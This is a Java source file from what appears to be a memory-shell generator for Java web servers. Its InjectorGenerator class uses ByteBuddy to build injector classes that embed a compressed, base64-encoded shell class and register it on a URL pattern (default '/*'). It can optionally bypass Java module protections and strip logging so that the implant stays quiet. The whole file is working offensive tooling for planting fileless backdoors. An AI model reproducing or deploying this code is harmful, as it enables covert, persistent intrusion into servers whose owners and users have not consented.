package com.reajason.javaweb.memshell;

import com.reajason.javaweb.buddy.ByPassJavaModuleInterceptor;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import org.apache.commons.codec.binary.Base64;

import java.util.Objects;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class InjectorGenerator {
    private final ShellConfig config;
    private final InjectorConfig injectorConfig;

    public InjectorGenerator(ShellConfig config, InjectorConfig injectorConfig) {
        this.config = config;
        this.injectorConfig = injectorConfig;
    }

    @SneakyThrows
    public DynamicType.Builder<?> getBuilder() {
        String base64String = Base64.encodeBase64String(
                        CommonUtil.gzipCompress(injectorConfig.getShellClassBytes()))
                .replace(System.lineSeparator(), "");
        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(injectorConfig.getInjectorClass())
                .name(injectorConfig.getInjectorClassName())
                .visit(new TargetJreVersionVisitorWrapper(config.getTargetJreVersion()))
                .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(injectorConfig.getUrlPattern(), "/*")))
                .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                .method(named("getClassName")).intercept(FixedValue.value(injectorConfig.getShellClassName()));


        if (config.needByPassJavaModule()) {
            builder = ByPassJavaModuleInterceptor.extend(builder);
        }

        if(config.isJakarta()){
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (config.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }
        return builder;
    }

    @SneakyThrows
    public byte[] generate() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}